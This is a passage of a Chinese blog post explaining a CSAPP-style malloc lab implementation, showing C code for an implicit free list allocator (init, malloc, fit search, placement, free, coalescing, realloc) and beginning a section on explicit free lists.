class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE       4       <span class="comment">/* Word and header/footer size (bytes) */</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE       8       <span class="comment">/* Double word size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE  (1&lt;&lt;12)  <span class="comment">/* Extend heap by this amount (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc)  ((size) | (alloc)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)       (*(unsigned int *)(p))           </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val)  (*(unsigned int *)(p) = (val))   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)                   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)                    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp)       ((char *)(bp) - WSIZE)                     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp)       ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp)  ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp)  ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE))) </span></span><br></pre></td></tr></table></figure><p>注释给出了每个宏的意义。</p><p>一些额外的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *free_list_head = <span class="literal">NULL</span>; <span class="comment">// 整个list的头部</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span>;<span class="comment">// heap 不够分配时，用于扩展heap大小</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;<span class="comment">// free block时，可能存在一些前后也是free block的情况，这时需要做合并，不允许一条list上，同时存在两个连续的free block</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;<span class="comment">// 在list上找到可满足本次malloc请求的block</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span>; <span class="comment">// 放置当前块，如果size &lt; 本次block size - MIN_BLOCK ，则需要做split操作</span></span><br></pre></td></tr></table></figure><h3 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h3><p>这个函数对mm做初始化，工作包括：</p><ol><li>分配4个字，第0个字为pad，为了后续分配的块payload首地址能够是8字节对齐。</li><li>第1-2个字为序言块，free_list_head指向这里，相当于给list一个定义，不然我们从哪里开始search呢？</li><li>第3个字，结尾块，主要用于确定尾边界。</li><li>extend_heap, 分配一大块heap，用于后续malloc请求时分配。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// Create the inital empty heap</span></span><br><span class="line">    <span class="keyword">if</span>( (free_list_head = mem_sbrk(<span class="number">4</span> * WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(free_list_head, <span class="number">0</span>);</span><br><span class="line">    PUT(free_list_head + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">    PUT(free_list_head + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">    PUT(free_list_head + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    free_list_head += (<span class="number">2</span> * WSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extend the empty heap with a free block of CHUNKSIZE bytes</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h3><p>工作：</p><ol><li>size更新，保证size为偶数个word</li><li>为当前分配的block添加元数据，即header和footer信息</li><li>更新尾边界</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span>( (<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化free block的header/footer和epilogue header</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Coalesce if the previous block was free</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>mm_malloc也比较简单，首先更改请求size，满足8字节对齐+元数据的开销要求。接着尝试找到当前可用heap中是否有能够满足本次请求的block，有则直接place，无则需要扩展当前可用heap的大小，扩展后再place。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">// Adjusted block size</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; <span class="comment">// Amount to extend heap if no fit</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ajust block size to include overhea and alignment reqs;</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE - <span class="number">1</span>)) / DSIZE); <span class="comment">// 超过8字节，加上header/footer块开销，向上取整保证是8的倍数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Search the free list for a fit</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// No fit found. Get more memory and place the block</span></span><br><span class="line">        extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">        <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc\n&quot;</span>);</span><br><span class="line">    print_allocated_info();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a>find_fit</h3><p>遍历整个list，找到还未分配且满足当前请求大小的block，然后返回该block的首地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 使用first-fit policy</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* 成功，返回可用块的首地址</span></span><br><span class="line"><span class="comment"> *               失败，返回NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp ;      </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(GET_ALLOC(HDRP(bp)) == <span class="number">0</span> &amp;&amp; size &lt;= GET_SIZE(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="place"><a href="#place" class="headerlink" title="place"></a>place</h3><p>place的工作也很简单：</p><ol><li>最小块大小（2*DSIZE) &lt;= 当前块的大小-当前请求的块大小 ，则对当前block做split</li><li>否则，直接place即可。</li></ol><p>现在继续看看free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief place block</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> remain_size;</span><br><span class="line">    <span class="keyword">size_t</span> origin_size;</span><br><span class="line"></span><br><span class="line">    origin_size = GET_SIZE(HDRP(bp));</span><br><span class="line">    remain_size = origin_size - size;</span><br><span class="line">    <span class="keyword">if</span>(remain_size &gt;= <span class="number">2</span>*DSIZE)  <span class="comment">// 剩下的块，最少需要一个double word (header/footer占用一个double word, pyaload不为空，再加上对齐要求)</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 不足一个双字，保留内部碎片</span></span><br><span class="line">        PUT(HDRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h3><p>可以看到，free也是相当简单的，将当前block的分配状态从1更新到0即可。然后做<strong>coalesce操作:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(ptr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free\n&quot;</span>);</span><br><span class="line">    print_allocated_info();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h3><p>free block后要考虑前后是否也有free block, 如果存在free block需要进行合并.下面给出了4种情况:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205642747.png" alt="image-20200826205642747"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205653451.png" alt="image-20200826205653451"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205703127.png" alt="image-20200826205703127"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205708948.png" alt="image-20200826205708948"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于存在序言块和尾块，避免了一些边界检查。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> pre_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pre_alloc &amp;&amp; next_alloc)&#123;    <span class="comment">// case1: 前后都分配</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pre_alloc &amp;&amp; !next_alloc)&#123;  <span class="comment">// case 2： 前分配，后free</span></span><br><span class="line">        <span class="keyword">void</span> *next_block = NEXT_BLKP(bp);</span><br><span class="line">        size += GET_SIZE(HDRP(next_block));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(next_block), PACK(size, <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 其余两个tag不用清空？ 正常情况确实不用清空。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!pre_alloc &amp;&amp; next_alloc)&#123;  <span class="comment">// case 3: 前free，后分配</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;      <span class="comment">// 前后两个都是free</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +</span><br><span class="line">                GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h3><p>realloc函数实现也很简单, 重新分配size大小的块,然后将旧块内容复制到新块内容上. 注意这里也考虑了block变小的情况.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line">    <span class="keyword">size_t</span> copySize;</span><br><span class="line">    </span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line">    <span class="keyword">if</span> (newptr == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = GET_SIZE(HDRP(oldptr));</span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)</span><br><span class="line">      copySize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok, 以上就是implicit list的所有内容, 下面我们开始讲解explicit list的实现.</p><h2 id="4-explicit-list"><a href="#4-explicit-list" class="headerlink" title="4. explicit list"></a>4. explicit list</h2><p>explicit list和implicit list的区别在于前者在 <strong>逻辑空间</strong> 中维护一个free list, 里面只保存free的blocks, 而后者则是在 <strong>虚拟地址空间</strong>中维护整个list,里面即包含了free blocks也包含了allocated blocks. 当然了, explicit list底层也是虚拟地址空间.下面这张图给出了explicit list的上层结构:</p><p><img data-src="https://pic.downk.cc/item/5f465f2f160a154a67918a70.png" alt="image-20200826210834218"></p><p>下面给出implicit和explicit的每一块的具体结构对比:</p><p><img data-src="https://pic.downk.cc/item/5f465f75160a154a6791b829.png" alt="image-20200826211059458"></p><p>可以看到,explicit比较implicit,每一个块只是多了两个字段,用于保存下一个free block的地址(next)和上一个free block的地址(prev).</p><p>想一下,explict的优点: 大大提高搜索free block的效率. 但是实现复杂度比implicit难,因为多一个逻辑空间的操作.</p><p>首先第一个问题,next和prev占用多大空间? 对于32位的os来说,地址空间的编址大小的32位(4字节), 64位的os则位64位(8字节). 为了简单起见,本文中只考虑32位的情况(gcc编译时加上-m32的参数,默认的makefile已经给出).</p><p>好的现在确定了next和prev的大小,再来确定一个最小块的大小,最小块应该包含header+footer+next+prev+payload,其中payload最小为1个字节, 同时最小块应该保证8字节对齐要求,综合以上所述,一个最小块为:<br>$$<br>4+4+4+1+4=17,向上取8字节对齐,则\<br>MIN_BLOCK = 24<br>$$<br>ok,现在再说明代码中做的一些规定:</p><ol><li>find策略,采用first-fit策略</li><li>对于free后的block应该如何重新插入free list, 本文采用LIFO策略</li><li>对齐约定, 8字节对齐</li></ol><p>有了以上的说明, 差不多就可以写代码了,先从定义的宏出发:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE 4             <span class="comment">/* Word and header/footer size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12) <span class="comment">/* Extend heap by this amount (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p) (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val) (*(unsigned int *)(p) = (unsigned int)(val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; 